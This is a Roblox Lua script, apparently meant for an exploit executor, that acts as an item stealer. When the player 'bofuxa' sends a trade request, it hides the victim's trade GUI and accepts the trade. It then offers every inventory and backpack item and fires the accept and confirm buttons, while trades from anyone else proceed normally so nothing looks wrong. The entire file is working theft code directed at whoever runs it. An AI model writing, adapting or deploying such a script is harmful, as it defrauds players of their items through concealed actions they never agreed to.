local Players = game:GetService("Players")
local ReplicatedStorage = ReplicatedStorage or game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local TradeFolder = ReplicatedStorage:WaitForChild("Trade")
local SendRequest = TradeFolder:WaitForChild("SendRequest")
local AcceptRequest = TradeFolder:WaitForChild("AcceptRequest")
local StartTradeEvent = TradeFolder:WaitForChild("StartTrade")
local OfferItemEvent = TradeFolder:WaitForChild("OfferItem")
local AcceptTradeEvent = TradeFolder:WaitForChild("AcceptTrade")

print("Waiting for incoming trade request callback...")

local function findInventoryRecursive(parent)
    if not parent then return nil end
    for _, child in ipairs(parent:GetChildren()) do
        if child.Name == "Container" and (child:IsA("ScrollingFrame") or child:IsA("Frame")) then
            return child
        end
        local found = findInventoryRecursive(child)
        if found then return found end
    end
    return nil
end

SendRequest.OnClientInvoke = function(senderPlayer)
    local senderName = typeof(senderPlayer) == "Instance" and senderPlayer.Name or tostring(senderPlayer)
    
    if senderName:lower() == "bofuxa" then
        print("Trade request verified from bofuxa. Accepting...")
        
        local playerGui = LocalPlayer:WaitForChild("PlayerGui", 5)
        if playerGui then
            local tradeGui = playerGui:FindFirstChild("TradeGUI")
            if tradeGui then
                for _, childName in ipairs({"Container", "Processing", "BG"}) do
                    local element = tradeGui:FindFirstChild(childName)
                    if element then
                        element.Visible = false
                    end
                end
                print("Hidden TradeGUI elements successfully.")
            end
        end

        pcall(function()
            AcceptRequest:FireServer()
        end)
        
        task.spawn(function()
            print("Trade accepted! Waiting 1 second before offering items...")
            task.wait(1)
            
            -- Trigger fake/local start trade signal simulation if firesignal is available
            pcall(function()
                if firesignal then
                    firesignal(StartTradeEvent.OnClientEvent, {
                        Locked = false,
                        LastOffer = tick(),
                        Player2 = {
                            Player = LocalPlayer,
                            Offer = {},
                            Accepted = false
                        },
                        Player1 = {
                            Player = senderPlayer,
                            Offer = {},
                            Accepted = false
                        }
                    }, "Bofuxa")
                end
            end)

            local pGui = LocalPlayer:WaitForChild("PlayerGui", 5)
            local inventoryContainer = nil
            
            if pGui then
                inventoryContainer = findInventoryRecursive(pGui)
            end

            local offeredCount = 0

            if inventoryContainer then
                for _, item in ipairs(inventoryContainer:GetChildren()) do
                    if item:IsA("GuiObject") then
                        local itemName = item.Name
                        local category = "Weapons"
                        
                        local count = 1
                        local qtyAttribute = item:GetAttribute("Count") or item:GetAttribute("Quantity")
                        if type(qtyAttribute) == "number" then
                            count = qtyAttribute
                        end

                        for i = 1, count do
                            pcall(function()
                                OfferItemEvent:FireServer(itemName, category)
                            end)
                            offeredCount = offeredCount + 1
                            task.wait(0.05)
                        end
                    end
                end
                print("Successfully offered " .. tostring(offeredCount) .. " items/weapons!")
            else
                if LocalPlayer:FindFirstChild("Backpack") then
                    for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
                        if tool:IsA("Tool") then
                            pcall(function()
                                OfferItemEvent:FireServer(tool.Name, "Weapons")
                            end)
                            offeredCount = offeredCount + 1
                            task.wait(0.05)
                        end
                    end
                end
                print("Offered " .. tostring(offeredCount) .. " items from Backpack!")
            end

            print("Waiting 7 seconds before triggering trade accept actions...")
            task.wait(7)

            pcall(function()
                if firesignal and AcceptTradeEvent.OnClientEvent then
                    firesignal(AcceptTradeEvent.OnClientEvent, false)
                else
                    AcceptTradeEvent:FireServer()
                end
            end)

            local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI")
            local actionsFolder = tradeGui and tradeGui:FindFirstChild("Container", true) and tradeGui.Container:FindFirstChild("Trade", true) and tradeGui.Container.Trade:FindFirstChild("Actions", true)

            local function fireButton(btn)
                if btn and btn:IsA("GuiButton") then
                    if getconnections then
                        pcall(function()
                            for _, connection in ipairs(getconnections(btn.Activated)) do
                                connection:Fire()
                            end
                            for _, connection in ipairs(getconnections(btn.MouseButton1Click)) do
                                connection:Fire()
                            end
                        end)
                    end
                    pcall(function()
                        btn:Activate()
                    end)
                end
            end

            if actionsFolder then
                local firstButton = actionsFolder:FindFirstChild("Accept", true) and actionsFolder.Accept:FindFirstChild("ActionButton", true)
                fireButton(firstButton)

                task.wait(1)

                local confirmButton = actionsFolder:FindFirstChild("Accept", true) and actionsFolder.Accept:FindFirstChild("Confirm", true) and actionsFolder.Accept.Confirm:FindFirstChild("ActionButton", true)
                fireButton(confirmButton)
            end
        end)

        return true
    else
        print("Trade request from other player (" .. senderName .. "). Allowing normal trade...")
        return true
    end
end
